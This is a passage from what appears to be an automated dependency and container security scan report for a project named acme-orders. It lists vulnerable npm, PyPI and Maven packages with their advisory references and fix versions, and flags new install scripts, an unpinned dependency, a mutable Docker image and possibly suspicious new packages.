- **Basis:** verified fact, confidence high

### F-022 · 🟧 High (8.8) · Vulnerable direct dependency

- **What:** node-fetch@2.6.0: 2 known vulnerabilities (highest HIGH, CVSS 8.8)
- **Component:** `node-fetch@2.6.0` (npm, scope prod, direct), purl `pkg:npm/node-fetch@2.6.0`
- **Where:** `package-lock.json`
- **Dependency path:** acme-orders@1.0.0 → node-fetch@2.6.0
- **Official severity:** HIGH, CVSS 8.8 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 2.6.7
- **Evidence:**
  - [GHSA-r683-j2x4-v87g](https://osv.dev/vulnerability/GHSA-r683-j2x4-v87g) (CVE-2022-0235): HIGH, CVSS 8.8, fixed in 2.6.7. node-fetch forwards secure headers to untrusted sites
  - [GHSA-w7rc-rwvf-8q5r](https://osv.dev/vulnerability/GHSA-w7rc-rwvf-8q5r) (CVE-2020-15168): LOW, CVSS 2.6, fixed in 2.6.1. The `size` option isn't honored after following a redirect in node-fetch
- **Initial risk:** High (8.8): highest advisory severity HIGH (CVSS 8.8)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-023 · 🟧 High (8.6) · Vulnerable direct dependency

- **What:** axios@0.21.0: 25 known vulnerabilities (highest HIGH, CVSS 8.6)
- **Component:** `axios@0.21.0` (npm, scope prod, direct), purl `pkg:npm/axios@0.21.0`
- **Where:** `package-lock.json`
- **Dependency path:** acme-orders@1.0.0 → axios@0.21.0
- **Official severity:** HIGH, CVSS 8.6 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 0.33.0
- **Evidence:**
  - [GHSA-pjwm-pj3p-43mv](https://osv.dev/vulnerability/GHSA-pjwm-pj3p-43mv) (CVE-2026-44492): HIGH, CVSS 8.6, fixed in 0.32.0. axios's shouldBypassProxy does not recognize IPv4-mapped IPv6 addresses, allowing NO_PROXY bypass (incomplete fix for CVE-2025-62718)
  - [GHSA-jr5f-v2jv-69x6](https://osv.dev/vulnerability/GHSA-jr5f-v2jv-69x6) (CVE-2025-27152): HIGH, fixed in 0.30.0. axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL
  - [GHSA-p92q-9vqr-4j8v](https://osv.dev/vulnerability/GHSA-p92q-9vqr-4j8v) (CVE-2026-44487): HIGH, fixed in 0.32.0. Axios: Proxy-Authorization Credential Leak to Origin Server Across HTTP-to-HTTPS Redirect in Axios Node.js HTTP Adapter
  - [GHSA-43fc-jf86-j433](https://osv.dev/vulnerability/GHSA-43fc-jf86-j433) (CVE-2026-25639): HIGH, CVSS 7.5, fixed in 0.30.3. Axios is Vulnerable to Denial of Service via __proto__ Key in mergeConfig
  - [GHSA-62hf-57xw-28j9](https://osv.dev/vulnerability/GHSA-62hf-57xw-28j9) (CVE-2026-42039): HIGH, CVSS 7.5, fixed in 0.31.1. Axios: unbounded recursion in toFormData causes DoS via deeply nested request data
  - [GHSA-cph5-m8f7-6c5x](https://osv.dev/vulnerability/GHSA-cph5-m8f7-6c5x) (CVE-2021-3749): HIGH, CVSS 7.5, fixed in 0.21.2. axios Inefficient Regular Expression Complexity vulnerability
  - [GHSA-hfxv-24rg-xrqf](https://osv.dev/vulnerability/GHSA-hfxv-24rg-xrqf) (CVE-2026-44496): HIGH, CVSS 7.5, fixed in 0.32.0. Axios: Regular Expression Denial of Service (ReDoS) via Cookie Name Injection
  - [GHSA-j5f8-grm9-p9fc](https://osv.dev/vulnerability/GHSA-j5f8-grm9-p9fc) (CVE-2026-44486): HIGH, CVSS 7.5, fixed in 0.32.0. Axios: Proxy-Authorization header leaks to redirect target when proxy is re-evaluated to direct connection
  - [GHSA-6chq-wfr3-2hj9](https://osv.dev/vulnerability/GHSA-6chq-wfr3-2hj9) (CVE-2026-42035): HIGH, CVSS 7.4, fixed in 0.31.1. Axios: Header Injection via Prototype Pollution
  - [GHSA-pf86-5x62-jrwf](https://osv.dev/vulnerability/GHSA-pf86-5x62-jrwf) (CVE-2026-42033): HIGH, CVSS 7.4, fixed in 0.31.1. Axios: Prototype Pollution Gadgets - Response Tampering, Data Exfiltration, and Request Hijacking
  - [GHSA-pmwg-cvhr-8vh7](https://osv.dev/vulnerability/GHSA-pmwg-cvhr-8vh7) (CVE-2026-42043): HIGH, CVSS 7.2, fixed in 0.31.1. Axios: Incomplete Fix for CVE-2025-62718 — NO_PROXY Protection Bypassed via RFC 1122 Loopback Subnet (127.0.0.0/8) in Axios 1.15.0
  - [GHSA-3g43-6gmg-66jw](https://osv.dev/vulnerability/GHSA-3g43-6gmg-66jw) (CVE-2026-44495): HIGH, CVSS 7.0, fixed in 0.31.1. axios Vulnerable to Credential Theft and Response Hijacking via Prototype Pollution Gadget in Config Merge
  - … 13 more in findings.json
- **Initial risk:** High (8.6): highest advisory severity HIGH (CVSS 8.6)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-024 · 🟧 High (8.6) · Vulnerable direct dependency

- **What:** jinja2@2.10.0: 6 known vulnerabilities (highest HIGH, CVSS 8.6)
- **Component:** `jinja2@2.10.0` (pypi, scope prod, direct), purl `pkg:pypi/jinja2@2.10.0`
- **Where:** `worker/requirements.txt:3`
- **Dependency path:** worker → jinja2@2.10.0
- **Official severity:** HIGH, CVSS 8.6 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 3.1.6
- **Evidence:**
  - [GHSA-462w-v97r-4m45](https://osv.dev/vulnerability/GHSA-462w-v97r-4m45) (CVE-2019-10906): HIGH, CVSS 8.6, fixed in 2.10.1. Jinja2 sandbox escape via string formatting
  - [GHSA-q2x7-8rv6-6q7h](https://osv.dev/vulnerability/GHSA-q2x7-8rv6-6q7h) (CVE-2024-56326): HIGH, CVSS 7.8, fixed in 3.1.5. Jinja has a sandbox breakout through indirect reference to format method
  - [GHSA-cpwx-vrp4-4pq7](https://osv.dev/vulnerability/GHSA-cpwx-vrp4-4pq7) (CVE-2025-27516): MEDIUM, fixed in 3.1.6. Jinja2 vulnerable to sandbox breakout through attr filter selecting format method
  - [GHSA-h5c8-rqwp-cp95](https://osv.dev/vulnerability/GHSA-h5c8-rqwp-cp95) (CVE-2024-22195): MEDIUM, CVSS 5.4, fixed in 3.1.3. Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter
  - [GHSA-h75v-3vvj-5mfj](https://osv.dev/vulnerability/GHSA-h75v-3vvj-5mfj) (CVE-2024-34064): MEDIUM, CVSS 5.4, fixed in 3.1.4. Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter
  - [GHSA-g3rq-g295-4j3m](https://osv.dev/vulnerability/GHSA-g3rq-g295-4j3m) (CVE-2020-28493): MEDIUM, CVSS 5.3, fixed in 2.11.3. Regular Expression Denial of Service (ReDoS) in Jinja2
- **Initial risk:** High (8.6): highest advisory severity HIGH (CVSS 8.6)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-025 · 🟧 High (8.1) · Vulnerable direct dependency

- **What:** lodash@4.17.15: 5 known vulnerabilities (highest HIGH, CVSS 8.1)
- **Component:** `lodash@4.17.15` (npm, scope prod, direct), purl `pkg:npm/lodash@4.17.15`
- **Where:** `package-lock.json`
- **Dependency path:** acme-orders@1.0.0 → lodash@4.17.15
- **Official severity:** HIGH, CVSS 8.1 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 4.18.0
- **Evidence:**
  - [GHSA-r5fr-rjxr-66jc](https://osv.dev/vulnerability/GHSA-r5fr-rjxr-66jc) (CVE-2026-4800): HIGH, CVSS 8.1, fixed in 4.18.0. lodash vulnerable to Code Injection via `_.template` imports key names
  - [GHSA-p6mc-m468-83gw](https://osv.dev/vulnerability/GHSA-p6mc-m468-83gw) (CVE-2020-8203): HIGH, CVSS 7.4, fixed in 4.17.19. Prototype Pollution in lodash
  - [GHSA-35jh-r3h4-6jhm](https://osv.dev/vulnerability/GHSA-35jh-r3h4-6jhm) (CVE-2021-23337): HIGH, CVSS 7.2, fixed in 4.17.21. Command Injection in lodash
  - [GHSA-xxjr-mmjv-4gpg](https://osv.dev/vulnerability/GHSA-xxjr-mmjv-4gpg) (CVE-2025-13465): MEDIUM, CVSS 6.5, fixed in 4.17.23. Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions
  - [GHSA-29mw-wpgm-hmr9](https://osv.dev/vulnerability/GHSA-29mw-wpgm-hmr9) (CVE-2020-28500): MEDIUM, CVSS 5.3, fixed in 4.17.21. Regular Expression Denial of Service (ReDoS) in lodash
- **Initial risk:** High (8.1): highest advisory severity HIGH (CVSS 8.1)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-026 · 🟧 High (8.0) · Vulnerable transitive dependency

- **What:** follow-redirects@1.13.0: 5 known vulnerabilities (highest HIGH, CVSS 8.0)
- **Component:** `follow-redirects@1.13.0` (npm, scope prod, transitive), purl `pkg:npm/follow-redirects@1.13.0`
- **Where:** `package-lock.json`
- **Dependency path:** acme-orders@1.0.0 → axios@0.21.0 → follow-redirects@1.13.0
- **Official severity:** HIGH, CVSS 8.0 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 1.16.0
- **Evidence:**
  - [GHSA-74fj-2j2h-c42q](https://osv.dev/vulnerability/GHSA-74fj-2j2h-c42q) (CVE-2022-0155): HIGH, CVSS 8.0, fixed in 1.14.7. Exposure of sensitive information in follow-redirects
  - [GHSA-cxjh-pqwp-8mfp](https://osv.dev/vulnerability/GHSA-cxjh-pqwp-8mfp) (CVE-2024-28849): MEDIUM, CVSS 6.5, fixed in 1.15.6. follow-redirects' Proxy-Authorization header kept across hosts
  - [GHSA-jchw-25xp-jwwc](https://osv.dev/vulnerability/GHSA-jchw-25xp-jwwc) (CVE-2023-26159): MEDIUM, CVSS 6.1, fixed in 1.15.4. Follow Redirects improperly handles URLs in the url.parse() function
  - [GHSA-pw2r-vq6v-hr8c](https://osv.dev/vulnerability/GHSA-pw2r-vq6v-hr8c) (CVE-2022-0536): MEDIUM, CVSS 5.9, fixed in 1.14.8. Exposure of Sensitive Information to an Unauthorized Actor in follow-redirects
  - [GHSA-r4q5-vmmm-2653](https://osv.dev/vulnerability/GHSA-r4q5-vmmm-2653) (CVE-2026-40895): MEDIUM, fixed in 1.16.0. follow-redirects leaks Custom Authentication Headers to Cross-Domain Redirect Targets
- **Initial risk:** High (8.0): highest advisory severity HIGH (CVSS 8.0)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-027 · 🟧 High (7.5) · Vulnerable transitive dependency

- **What:** com.fasterxml.jackson.core:jackson-core@2.9.8: 4 known vulnerabilities (highest HIGH, CVSS 7.5)
- **Component:** `com.fasterxml.jackson.core:jackson-core@2.9.8` (maven, scope prod, transitive), purl `pkg:maven/com.fasterxml.jackson.core/jackson-core@2.9.8`
- **Where:** `notifier/pom.xml`
- **Dependency path:** com.acme:notifier@1.0.0 → com.fasterxml.jackson.core:jackson-databind@2.9.8 → com.fasterxml.jackson.core:jackson-core@2.9.8
- **Official severity:** HIGH, CVSS 7.5 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 2.18.11
- **Evidence:**
  - [GHSA-h46c-h94j-95f3](https://osv.dev/vulnerability/GHSA-h46c-h94j-95f3) (CVE-2025-52999): HIGH, fixed in 2.15.0. jackson-core can throw a StackoverflowError when processing deeply nested data
  - [GHSA-r7wm-3cxj-wff9](https://osv.dev/vulnerability/GHSA-r7wm-3cxj-wff9) (CVE-2026-68494): HIGH, fixed in 2.18.8. jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)
  - [GHSA-7hhh-6rmp-j9qf](https://osv.dev/vulnerability/GHSA-7hhh-6rmp-j9qf) (CVE-2026-89425): HIGH, CVSS 7.5, fixed in 2.18.11. jackson-core: UTF8DataInputJsonParser._reportInvalidToken() missing maxErrorTokenLength limit -> unbounded StringBuilder growth (DoS)
  - [GHSA-wf8f-6423-gfxg](https://osv.dev/vulnerability/GHSA-wf8f-6423-gfxg) (CVE-2025-49128): MEDIUM, CVSS 4.0, fixed in 2.13.0. Jackson-core Vulnerable to Memory Disclosure via Source Snippet in JsonLocation
- **Initial risk:** High (7.5): highest advisory severity HIGH (CVSS 7.5)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-028 · 🟧 High (7.5) · Vulnerable direct dependency

- **What:** requests@2.19.1: 5 known vulnerabilities (highest HIGH, CVSS 7.5)
- **Component:** `requests@2.19.1` (pypi, scope prod, direct), purl `pkg:pypi/requests@2.19.1`
- **Where:** `worker/requirements.txt:1`
- **Dependency path:** worker → requests@2.19.1
- **Official severity:** HIGH, CVSS 7.5 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 2.33.0
- **Evidence:**
  - [GHSA-x84v-xcm2-53pg](https://osv.dev/vulnerability/GHSA-x84v-xcm2-53pg) (CVE-2018-18074): HIGH, CVSS 7.5, fixed in 2.20.0. Insufficiently Protected Credentials in Requests
  - [GHSA-j8r2-6x86-q33q](https://osv.dev/vulnerability/GHSA-j8r2-6x86-q33q) (CVE-2023-32681): MEDIUM, CVSS 6.1, fixed in 2.31.0. Unintended leak of Proxy-Authorization header in requests
  - [GHSA-9wx4-h78v-vm56](https://osv.dev/vulnerability/GHSA-9wx4-h78v-vm56) (CVE-2024-35195): MEDIUM, CVSS 5.6, fixed in 2.32.0. Requests `Session` object does not verify requests after making first request with verify=False
  - [GHSA-9hjg-9r4m-mvj7](https://osv.dev/vulnerability/GHSA-9hjg-9r4m-mvj7) (CVE-2024-47081): MEDIUM, CVSS 5.3, fixed in 2.32.4. Requests vulnerable to .netrc credentials leak via malicious URLs
  - [GHSA-gc5v-m9x4-r6x2](https://osv.dev/vulnerability/GHSA-gc5v-m9x4-r6x2) (CVE-2026-25645): MEDIUM, CVSS 4.4, fixed in 2.33.0. Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function
- **Initial risk:** High (7.5): highest advisory severity HIGH (CVSS 7.5)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-029 · 🟧 High (7.5) · Vulnerable transitive dependency

- **What:** urllib3@1.23.0: 12 known vulnerabilities (highest HIGH, CVSS 7.5)
- **Component:** `urllib3@1.23.0` (pypi, scope prod, transitive), purl `pkg:pypi/urllib3@1.23.0`
- **Where:** `worker/requirements.txt:1`
- **Dependency path:** worker → requests@2.19.1 → urllib3@1.23.0
- **Official severity:** HIGH, CVSS 7.5 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 2.8.0
- **Evidence:**
  - [GHSA-2xpw-w6gg-jr37](https://osv.dev/vulnerability/GHSA-2xpw-w6gg-jr37) (CVE-2025-66471): HIGH, fixed in 2.6.0. urllib3 streaming API improperly handles highly compressed data
  - [GHSA-vxq7-64xx-v4gw](https://osv.dev/vulnerability/GHSA-vxq7-64xx-v4gw) (CVE-2026-97689): HIGH, fixed in 2.8.0. urllib3: HTTPResponse.stream()/read_chunked() buffers an unbounded chunk-size line into memory
  - [GHSA-38jv-5279-wg99](https://osv.dev/vulnerability/GHSA-38jv-5279-wg99) (CVE-2026-21441): HIGH, CVSS 7.5, fixed in 2.6.3. Decompression-bomb safeguards bypassed when following HTTP redirects (streaming API)
  - [GHSA-mh33-7rrq-662w](https://osv.dev/vulnerability/GHSA-mh33-7rrq-662w) (CVE-2019-11324): HIGH, CVSS 7.5, fixed in 1.24.2. Improper Certificate Validation in urllib3
  - [GHSA-wqvq-5m8c-6g24](https://osv.dev/vulnerability/GHSA-wqvq-5m8c-6g24) (CVE-2020-26137): MEDIUM, CVSS 6.5, fixed in 1.25.9. CRLF injection in urllib3
  - [GHSA-gwvm-45gx-3cf8](https://osv.dev/vulnerability/GHSA-gwvm-45gx-3cf8) (CVE-2018-25091): MEDIUM, CVSS 6.1, fixed in 1.24.2. Authorization Header forwarded on redirect
  - [GHSA-r64q-w8jr-g9qp](https://osv.dev/vulnerability/GHSA-r64q-w8jr-g9qp) (CVE-2019-11236): MEDIUM, CVSS 6.1, fixed in 1.24.3. Improper Neutralization of CRLF Sequences in urllib3 library for Python
  - [GHSA-v845-jxx5-vc9f](https://osv.dev/vulnerability/GHSA-v845-jxx5-vc9f) (CVE-2023-43804): MEDIUM, CVSS 5.9, fixed in 1.26.17. `Cookie` HTTP header isn't stripped on cross-origin redirects
  - [GHSA-pq67-6m6q-mj2v](https://osv.dev/vulnerability/GHSA-pq67-6m6q-mj2v) (CVE-2025-50181): MEDIUM, CVSS 5.3, fixed in 2.5.0. urllib3 redirects are not disabled when retries are disabled on PoolManager instantiation
  - [GHSA-qccp-gfcp-xxvc](https://osv.dev/vulnerability/GHSA-qccp-gfcp-xxvc) (CVE-2026-44431): MEDIUM, CVSS 5.3, fixed in 2.7.0. urllib3: Sensitive headers forwarded across origins in proxied low-level redirects
  - [GHSA-34jh-p97f-mpxf](https://osv.dev/vulnerability/GHSA-34jh-p97f-mpxf) (CVE-2024-37891): MEDIUM, CVSS 4.4, fixed in 1.26.19. urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects
  - [GHSA-g4mx-q9vg-27p4](https://osv.dev/vulnerability/GHSA-g4mx-q9vg-27p4) (CVE-2023-45803): MEDIUM, CVSS 4.2, fixed in 1.26.18. urllib3's request body not stripped after redirect from 303 status changes request method to GET
- **Initial risk:** High (7.5): highest advisory severity HIGH (CVSS 7.5)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-030 · 🟨 Medium (6.5) · Untrusted image · 🆕 new in this change

- **What:** Dockerfile runs 'npm install' with install scripts enabled
- **Where:** `Dockerfile:5`
- **Evidence:**
  - `Dockerfile:5`: `RUN npm install`
- **Initial risk:** Medium (6.5): R13_CONTAINER_HARDENING default level Medium; introduced in the latest change
- **Why it matters:** The container build or runtime is less isolated than it could be.
- **Basis:** verified fact, confidence high

### F-031 · 🟨 Medium (6.5) · Unsafe install script · 🆕 new in this change

- **What:** acme-orders@1.0.0 runs a 'postinstall' script on every install: node scripts/setup.js
- **Where:** `package.json:8`
- **Evidence:**
  - `package.json:8`: `"postinstall": "node scripts/setup.js"`
- **Initial risk:** Medium (6.5): R03_INSTALL_SCRIPT default level Medium; introduced in the latest change
- **Why it matters:** Install scripts run arbitrary code on every machine that installs the package, including CI.
- **Basis:** verified fact, confidence high

### F-032 · 🟨 Medium (6.5) · Untrusted image · 🆕 new in this change

- **What:** image fastbuilds42/node:latest uses a mutable tag and no digest
- **Component:** `fastbuilds42/node:latest` (docker, scope prod, direct), purl `pkg:docker/fastbuilds42/node@latest?repository_url=docker.io`
- **Where:** `Dockerfile:1`
- **Dependency path:** Dockerfile → fastbuilds42/node:latest
- **Evidence:**
  - `Dockerfile:1`: `FROM docker.io/fastbuilds42/node:latest`
- **Initial risk:** Medium (6.5): R11_MUTABLE_IMAGE_TAG default level Medium; introduced in the latest change
- **Why it matters:** A 'latest' / missing tag without a digest can point to different content tomorrow.
- **Basis:** verified fact, confidence high

### F-033 · 🟨 Medium (6.5) · Unexpected dependency · 🆕 new in this change

- **What:** new dev dependency crossenv@7.0.3 added in package.json
- **Component:** `crossenv@7.0.3` (npm, scope dev, direct), purl `pkg:npm/crossenv@7.0.3`
- **Where:** `package.json:18`
- **Dependency path:** acme-orders@1.0.0 → crossenv@7.0.3
- **Evidence:**
  - `package.json:18`: `"crossenv": "7.0.3"`
  - commit `8cad42e` by fastbuilds42 <fastbuilds42@users.example.invalid>, 2026-11-23T13:19:53+05:30: "chore: routine dependency refresh"
- **Initial risk:** Medium (6.5): R08_UNEXPECTED_DEPENDENCY default level Medium; introduced in the latest change
- **Why it matters:** A new direct dependency enters the application and should be reviewed.
- **Basis:** verified fact, confidence high

### F-034 · 🟨 Medium (6.5) · Unexpected dependency · 🆕 new in this change

- **What:** new prod dependency python3-dateutil@2.8.1 added in worker/requirements.txt
- **Component:** `python3-dateutil@2.8.1` (pypi, scope prod, direct), purl `pkg:pypi/python3-dateutil@2.8.1`
- **Where:** `worker/requirements.txt:4`
- **Dependency path:** worker → python3-dateutil@2.8.1
- **Evidence:**
  - `worker/requirements.txt:4`: `python3-dateutil==2.8.1`
  - commit `8cad42e` by fastbuilds42 <fastbuilds42@users.example.invalid>, 2026-11-23T13:19:53+05:30: "chore: routine dependency refresh"
- **Initial risk:** Medium (6.5): R08_UNEXPECTED_DEPENDENCY default level Medium; introduced in the latest change
- **Why it matters:** A new direct dependency enters the application and should be reviewed.
- **Basis:** verified fact, confidence high

### F-035 · 🟨 Medium (6.5) · Unexpected dependency · 🆕 new in this change

- **What:** new prod dependency urllib3@2.8.0 added in worker/requirements.txt
- **Component:** `urllib3@2.8.0` (pypi, scope prod, direct), purl `pkg:pypi/urllib3@2.8.0`
- **Where:** `worker/requirements.txt:5`
- **Dependency path:** worker → urllib3@2.8.0
- **Evidence:**
  - `worker/requirements.txt:5`: `urllib3`
  - commit `8cad42e` by fastbuilds42 <fastbuilds42@users.example.invalid>, 2026-11-23T13:19:53+05:30: "chore: routine dependency refresh"
- **Initial risk:** Medium (6.5): R08_UNEXPECTED_DEPENDENCY default level Medium; introduced in the latest change
- **Why it matters:** A new direct dependency enters the application and should be reviewed.
- **Basis:** verified fact, confidence high

### F-036 · 🟨 Medium (6.5) · Vulnerable transitive dependency

- **What:** org.apache.commons:commons-lang3@3.11: 1 known vulnerability (highest MEDIUM, CVSS 6.5)
- **Component:** `org.apache.commons:commons-lang3@3.11` (maven, scope prod, transitive), purl `pkg:maven/org.apache.commons/commons-lang3@3.11`
- **Where:** `notifier/pom.xml`
- **Dependency path:** com.acme:notifier@1.0.0 → org.apache.commons:commons-text@1.9 → org.apache.commons:commons-lang3@3.11
- **Official severity:** MEDIUM, CVSS 6.5 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 3.18.0
- **Evidence:**
  - [GHSA-j288-q9x7-2f5v](https://osv.dev/vulnerability/GHSA-j288-q9x7-2f5v) (CVE-2025-48924): MEDIUM, CVSS 6.5, fixed in 3.18.0. Apache Commons Lang is vulnerable to Uncontrolled Recursion when processing long inputs
- **Initial risk:** Medium (6.5): highest advisory severity MEDIUM (CVSS 6.5)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-037 · 🟨 Medium (6.2) · Vulnerable transitive dependency

- **What:** idna@2.7.0: 2 known vulnerabilities (highest MEDIUM, CVSS 6.2)
- **Component:** `idna@2.7.0` (pypi, scope prod, transitive), purl `pkg:pypi/idna@2.7.0`
- **Where:** `worker/requirements.txt:1`
- **Dependency path:** worker → requests@2.19.1 → idna@2.7.0
- **Official severity:** MEDIUM, CVSS 6.2 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 3.15
- **Evidence:**
  - [GHSA-jjg7-2v4v-x38h](https://osv.dev/vulnerability/GHSA-jjg7-2v4v-x38h) (CVE-2024-3651): MEDIUM, CVSS 6.2, fixed in 3.7. Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode
  - [GHSA-65pc-fj4g-8rjx](https://osv.dev/vulnerability/GHSA-65pc-fj4g-8rjx) (CVE-2026-45409): MEDIUM, CVSS 5.3, fixed in 3.15. Internationalized Domain Names in Applications (IDNA): Specially crafted inputs to idna.encode() can bypass CVE-2024-3651 fix
- **Initial risk:** Medium (6.2): highest advisory severity MEDIUM (CVSS 6.2)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-038 · 🟨 Medium (5.5) · Vulnerable transitive dependency

- **What:** org.apache.logging.log4j:log4j-api@2.14.1: 1 known vulnerability (highest MEDIUM)
- **Component:** `org.apache.logging.log4j:log4j-api@2.14.1` (maven, scope prod, transitive), purl `pkg:maven/org.apache.logging.log4j/log4j-api@2.14.1`
- **Where:** `notifier/pom.xml`
- **Dependency path:** com.acme:notifier@1.0.0 → org.apache.logging.log4j:log4j-core@2.14.1 → org.apache.logging.log4j:log4j-api@2.14.1
- **Official severity:** MEDIUM (advisory severity label (OSV))
- **Fix available:** upgrade to ≥ 2.25.5
- **Evidence:**
  - [GHSA-qv9r-c865-cp47](https://osv.dev/vulnerability/GHSA-qv9r-c865-cp47) (CVE-2026-49844): MEDIUM, fixed in 2.25.5. Apache Log4j API: Improper encoding of non-finite floating-point values during MapMessage JSON serialization
- **Initial risk:** Medium (5.5): highest advisory severity MEDIUM
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-039 · 🟨 Medium (4.0) · Suspicious package update · 🆕 new in this change

- **What:** 'urllib3' has no exact version in worker/requirements.txt (any version)
- **Where:** `worker/requirements.txt:5`
- **Evidence:**
  - `worker/requirements.txt:5`: `urllib3`
- **Initial risk:** Medium (4.0): R09_UNPINNED_DEPENDENCY default level Low; introduced in the latest change
- **Why it matters:** Without an exact version, a future (possibly compromised) release is installed silently.
- **Basis:** verified fact, confidence high

### F-040 · 🟨 Medium (4.0) · Untrusted image · 🆕 new in this change

- **What:** Dockerfile sets no USER: the container runs as the base image's default user (usually root)
- **Where:** `Dockerfile`
- **Evidence:**
  - no USER instruction in the final stage chain of Dockerfile
- **Initial risk:** Medium (4.0): R13_CONTAINER_HARDENING default level Low; introduced in the latest change
- **Why it matters:** The container build or runtime is less isolated than it could be.
- **Basis:** verified fact, confidence high

### F-041 · 🟨 Medium (4.0) · Unsafe install script · 🆕 new in this change

- **What:** crossenv@7.0.3 runs an install script (code not inspected)
- **Component:** `crossenv@7.0.3` (npm, scope dev, direct), purl `pkg:npm/crossenv@7.0.3`
- **Where:** `package-lock.json`
- **Dependency path:** acme-orders@1.0.0 → crossenv@7.0.3
- **Evidence:**
  - lockfile marks crossenv@7.0.3 with hasInstallScript: true
- **Initial risk:** Medium (4.0): R03_INSTALL_SCRIPT default level Low; introduced in the latest change
- **Why it matters:** Install scripts run arbitrary code on every machine that installs the package, including CI.
- **Basis:** verified fact, confidence high

## 5. Notes and limits

- none
- Day 1 scope: visibility and detection. Reachability, exploitability (KEV/EPSS) and remediation are Day 2.
- Typosquat results are heuristic (name similarity) and need human review.
